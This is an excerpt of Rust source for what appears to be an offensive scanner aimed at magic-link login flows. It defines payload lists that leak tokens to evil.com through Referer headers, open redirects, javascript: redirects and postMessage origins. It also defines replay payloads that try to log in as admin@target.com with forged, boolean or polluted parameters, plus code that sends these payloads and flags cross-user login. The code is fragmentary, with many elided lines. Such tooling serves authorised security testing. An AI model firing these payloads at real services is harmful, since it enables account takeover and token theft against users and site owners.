...
const TOKEN_LEAK_VECTORS: &[(&str, &str)] = &[
    ...
    (
        "Referer with token",
        "Referer: https://evil.com/?token=leaked",
    ),
    (
        "Open redirect + token",
        "?redirect_uri=https://evil.com&token=test",
    ),
    ("Token in URL fragment", "#token=magic_token_value"),
    ("Token in URL query", "?token=magic_token_value"),
    (
        "Token via meta refresh",
        "?redirect=javascript:location='https://evil.com/'+location.hash",
    ),
    ("Token via postMessage", "?target_origin=https://evil.com"),
    ("Token via CORS", "Origin: https://evil.com"),
    (
        "Token via preload",
        "Link: <https://evil.com>; rel=preload; as=fetch",
    ),
...
const REPLAY_PAYLOADS: &[(&str, &str, &str)] = &[
    ...
    (
        "Cross-user token",
        "GET",
        "token=other_user_token&email=admin@target.com",
    ),
    ...
    (
        ...
        "POST",
        "email=admin@target.com&token=any",
    ),
    (
        "Email change mid-flow",
        "POST",
        "email=attacker@evil.com&token=valid_token",
    ),
    ...
    (
        ...
        "POST",
        r#"{"token":true,"email":"admin@target.com"}"#,
    ),
    (
        "Mass token request",
        "POST",
        "email=victim@target.com&email=admin@target.com",
    ),
...
pub async fn abuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    ...
    println!(
        "\n{} [1/3] Magic link endpoint discovery...",
        "[*]".cyan().bold()
    );
        ...
        match req.send().await {
            Ok(resp) => {
                ...
                let location = resp
                    ...
                    .to_string();
                let body = resp.text().await.unwrap_or_default();
                let leaks_token = location.contains("token=")
                    || body.contains("token=")
    ...
    println!(
        "\n{} [3/3] Token replay & cross-user auth...",
        "[*]".cyan().bold()
    );
    ...
    for (name, method, body) in REPLAY_PAYLOADS {
        ...
        match req.send().await {
            Ok(resp) => {
                ...
                let has_auth = resp_body.contains("authenticated")
                    || resp_body.contains("session")
                    || resp_body.contains("token")
                    || resp_body.contains("user");
    ...
    if !leak_results.is_empty() {
        println!(
            "{} [HIGH] Token leakage via Referer/redirect — tokens can be stolen!",
            "[!]".red().bold()
        );
    }
    if !replay_results.is_empty() {
        let cross_user = replay_results
            .iter()
            .any(|n| n.contains("Cross") || n.contains("email"));
        let brute = replay_results
            .iter()
            .any(|n| n.contains("brute") || n.contains("Brute"));
        let sqli = replay_results
            .iter()
            .any(|n| n.contains("SQL") || n.contains("NoSQL"));
        if cross_user {
            println!(
                "{} [CRITICAL] Cross-user authentication — login as any user!",
                "[!]".red().bold()
            );
        }
        if brute {
            println!(
                "{} [HIGH] Token brute force — predictable/short tokens!",
                "[!]".red().bold()
            );
        }
        if sqli {
            println!(
                "{} [CRITICAL] SQL/NoSQL injection in token validation!",
                "[!]".red().bold()
            );
        }
    }
